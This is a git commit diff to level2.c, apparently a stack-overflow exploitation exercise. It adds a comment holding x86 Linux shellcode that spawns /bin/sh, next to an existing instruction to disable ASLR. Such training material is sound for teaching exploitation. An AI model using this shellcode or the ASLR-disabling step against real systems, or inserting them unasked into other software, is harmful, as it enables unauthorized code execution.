5c7c3413a5ad58d0dce103873fd2ea960dd5bf5b
jabeaumont <jabeaumont@coveo.com>
2019-03-08 18:06:36 -0500

    Added shellcode for level 2

--- level2.c
+++ level2.c
@@ -8,6 +8,10 @@ run this command to deactivate ASLR for this session :
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 */
 
+/*
+shellcode : "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"
+*/
+
 int this_is_a_win_function()
 {
     printf("Well, you learned how to jump somewhere last time...can you jump in the stack now?\n");
